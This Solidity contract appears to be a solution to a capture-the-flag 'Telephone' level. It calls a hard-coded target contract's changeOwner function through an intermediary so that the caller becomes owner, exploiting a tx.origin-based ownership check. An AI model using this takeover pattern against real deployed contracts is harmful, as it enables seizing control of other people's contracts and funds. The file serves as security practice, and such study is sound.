// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

interface ITelephone {
    function changeOwner(address) external;
}

contract TelephoneHack {
    ITelephone public telephone = ITelephone(0xc1c63f9f5ae3013fe954Ad5DbAeF3c5Ba4F8b4c1);

    function changeOwner() public {
        telephone.changeOwner(msg.sender);
    }
}
